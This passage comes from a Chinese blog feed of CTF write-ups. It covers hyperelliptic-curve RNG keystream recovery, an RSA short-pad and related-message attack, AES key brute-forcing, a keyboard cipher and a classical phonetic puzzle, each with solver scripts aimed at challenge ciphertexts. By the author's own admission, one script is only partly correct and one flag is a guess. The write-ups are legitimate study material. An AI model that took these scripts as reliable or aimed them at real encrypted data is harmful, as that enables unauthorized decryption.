self.Ds</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.q:</span><br><span class="line">            u,v = <span class="built_in">sum</span>(self.clk())</span><br><span class="line">            rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">            self.q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">        r, self.q = self.q[<span class="number">0</span>], self.q[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self()</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"><span class="keyword">import</span> re; <span class="keyword">assert</span> re.match(<span class="string">r&#x27;hxp\&#123;\w+\&#125;&#x27;</span>, flag, re.ASCII)</span><br><span class="line"></span><br><span class="line">text = <span class="string">f&quot;Hello! The flag is: <span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(RNG(), text.encode())).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>显然代码对比起来看，<code>f = y + y^7</code>只是<code>f = y + prod(map(eval, &#39;yyyyyyy&#39;))</code>变换一种形式，主要的不同在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br></pre></td></tr></table></figure>

<p>这个key的长度不够，是循环取的</p>
<p>找了一些脚本，没怎么看原理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a0955c882185b50a69d9d19a24778519d6da23894e667d7130b495b645caac72163d242923caa00af845f25890&#x27;</span>)</span><br><span class="line">known_pt = <span class="string">&#x27;Hello! The flag is: hxp&#123;&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(rng_output+q, enc))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>稍微改了下，<code>enc</code>和<code>known_pt</code>是显然要改的，后者就选24度好了，和原脚本一样，虽然题目给了很大一半</p>
<p>还有就是最后这里，就使得key不要越界，取个余</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不完全正确的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>)</span><br><span class="line">known_pt = (<span class="string">&#x27;a&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;flag&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007201746271.png" alt="image-20211007201746271"/>

<p>我看最后一串挺执着的，加上已经知道<code>flag&#123;1b82f60a-43ab-4f18-8ccc</code></p>
<p>大胆连在一起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;</span><br></pre></td></tr></table></figure>

<p>感觉应该是对的</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>20210522 NEEPU Sec2021公开赛Crypto方向WP</title>
    <url>/posts/e22cbbee/</url>
    <content><![CDATA[<p>和buu一个风格的网站</p>
<p>又是被组员嘲讽的一天</p>
<span id="more"></span>

<h1 id="NEEPU-Sec2021公开赛"><a href="#NEEPU-Sec2021公开赛" class="headerlink" title="NEEPU Sec2021公开赛"></a>NEEPU Sec2021公开赛</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>组员都做出来，自己都没有想到，反思一下</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>代码并不复杂，常规的运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;Neepu&#123;********************&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = nextprime(random.randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = encode(p, q, e)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;</span></span><br><span class="line"><span class="string">&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;</span></span><br><span class="line"><span class="string">&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;</span></span><br><span class="line"><span class="string">&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h4><p>首先套了一个短的padding的，用Related Message Attack可以整出来，接用la师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt; x, y &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt; xn &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt; xz, yz &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x + y) ^ e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits() // (<span class="number">2</span> * e * e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x + diff) ^ e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c2 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">    c1 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">    n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m2:&quot;</span>, m1 + diff)</span><br></pre></td></tr></table></figure>

<p>出来是<br><img alt="20210522 又是被组员嘲讽的一天-a21cb98f.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-a21cb98f.png" width="" height="" ><br>显然第二个才是我们需要的m，两个相减可以得到e</p>
<p>其次，出题人用一个加密函数加密了p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br></pre></td></tr></table></figure>

<p>提取一下，已知</p>
<p>$e\times S\equiv 1\ (mod\ (p+1)*(q+1))$<br>$not_p\equiv S\ (mod\ (p+1))$</p>
<p>这里主要是引入一条显而易见的形式<br>$$<br>若n\ mod\ (p*q)=1，则n\ mod\ q=1，n\ mod\ p=1<br>$$<br>这个结论的证明很简单，如果说n是p和q的乘积多1的话，那么，显然n也是p的倍数多1，q也同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">c1 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">c2 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">c = <span class="number">78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span></span><br><span class="line">m_e = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340930</span></span><br><span class="line">m = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br><span class="line"><span class="comment"># e = m_e - m</span></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line">e = <span class="number">71</span></span><br><span class="line">not_p = m</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*not_p-<span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> isPrime((e*not_p-<span class="number">1</span>) // i - <span class="number">1</span>):</span><br><span class="line">        p = (e*not_p-<span class="number">1</span>) // i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = os.urandom(<span class="number">18</span>)</span><br><span class="line">flag_enc = os.urandom(<span class="number">45</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_enc)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;Neepu&#123;&#x27;</span></span><br><span class="line">flag_enc = pad+flag_enc+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">masg1 = flag_enc[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">masg2 = flag_enc[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(masg1) ^ bytes_to_long(masg2)</span><br><span class="line">key = os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">iv = masg2[<span class="number">16</span>:][:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv))</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">enc_flag = aes.encrypt(long_to_bytes(m))</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个题目有两个值得我注意的，一是之一直都不知道AES这么爆破，但是现在知道怎么用脚本了，多亏了组员给我压力，但是原理后面还是要好好研究；二是找到一个全新的加密形式，利用键盘把选择被包围起来的字母，这个下面再说</p>
<p>首先找了下脚本，可以跑出iv和key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">xor = <span class="number">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line">out = long_to_bytes(xor)</span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:]) ^ bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">iv = long_to_bytes(iv)</span><br></pre></td></tr></table></figure>

<p>然后这里我们可以算出一部分的masg1，接着</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(bytes_to_long(m) ^ bytes_to_long(iv)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\r\x11\x18\x0b\x08L\x08\x0b\r\x0c\x14\n!\x00\x16\x13u&#123;qszeftwdr-thui&#x27;</span><br></pre></td></tr></table></figure>

<p>一看刚好是16位，结合前面的12个a还有’Neep’，整好32位，masg1齐了，他们和密文是异或的关系，那么masg2还会远吗？答案是肯定的，远</p>
<p>个der</p>
<p>连起来是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125;</span><br></pre></td></tr></table></figure>

<p>我交了，我错了</p>
<p>没道理啊，虽然确实没有什么含义</p>
<p>但是又是307，又是那个男人，在我迷茫的时候给我指点迷津</p>
<p>手打了一遍之后发现是一种新编码，在Crypto全是古典的宁波赛上也遇到过<br>在电脑键盘上被这些字母包围起来的是真正的明文</p>
<p>根据分隔符提示，flag里面包着的应该是下面这一串，可能会有几个字母对错，根据含义就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">are-you-kidding</span><br></pre></td></tr></table></figure>

<h3 id="中国古代加密"><a href="#中国古代加密" class="headerlink" title="中国古代加密"></a>中国古代加密</h3><img alt="20210522 又是被组员嘲讽的一天-d5aef625.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-d5aef625.png" width="" height="" >

<p>挺有意思的提道题，主要是运用到了反切注音</p>
<p>然后一些细节有点费解吧</p>
<p>然后出了三条hint，比赛结束了才有时间写wp，主要是说第一个红字处的对子是构成了flag的头尾，然后第二个红字处的一首诗歌要分成上下来看，还有就是排列组合，其他的感觉也没什么用</p>
<p>我就从做出来的角度返回去看吧，求解的过程中还是很曲折的</p>
<p>首先我们看头尾是花甲重逢+三七岁月和古稀双庆+一度春秋，这个对子的出处就是乾隆和纪晓岚为一为140岁老人对的，60 * 2 + 27和70 * 2 + 1都是等于141，所以收尾开头是141</p>
<p>其次两首诗分开，前两句是对应声母，找出密文对应的声母在头两句14个字中的位子，后两句是对应韵母，同样也是找对应的，并且这里不考虑声调，声调是另外编码的1~4，然后拼凑起来，注意这里是要凑的，因为存在重复的韵母和声母，而且也没有确切指明是哪一个</p>
<p>最后的flag是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">141181832310414124141</span><br></pre></td></tr></table></figure>

<p>这么看比较简单，但是当时提示比较少，走了很多歪路，因为反切注音还有很多变式和不成文的规定</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="The-Puzzles-of-the-Fifteen-Tiles"><a href="#The-Puzzles-of-the-Fifteen-Tiles" class="headerlink" title="The Puzzles of the Fifteen Tiles"></a>The Puzzles of the Fifteen Tiles</h3><img alt="20210522 又是被组员嘲讽的一天-76ae8347.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-76ae8347.png" width="" height="" >

<p>看看这个男人的嘴脸</p>
<p>第一次玩的时候，前面三行都整好了，但是最后一行借助倒数第三行怎么也搞不好</p>
<p>然后去找了一些技巧，主要有两点，第一是要制造出这样的形状，就容易得多</p>
<img alt="20210522 又是被组员嘲讽的一天-ee4c638b.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-ee4c638b.png" width="" height="" >

<p>其次，最后两排应该这样排好这两排的第一列， 然后是第二列，依次下去</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210516 国赛Crypto方向部分WP</title>
    <url>/posts/766eb6e4/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="20210516-国赛Crypto方向部分WP"><a href="#20210516-国赛Crypto方向部分WP" class="headerlink" title="20210516 国赛Crypto方向部分WP"></a>20210516 国赛Crypto方向部分WP</h1><h2 id="【古典签到】（recuring）"><a href="#【古典签到】（recuring）" class="headerlink" title="【古典签到】（recuring）"></a>【古典签到】（recuring）</h2><p><em>做完忘记名字了</em></p>
<p>一道签到题，都是古典密码，一开始用的是ADFGX加密，<a href="https://www.dcode.fr/en">推荐这个网站，贼好用</a></p>
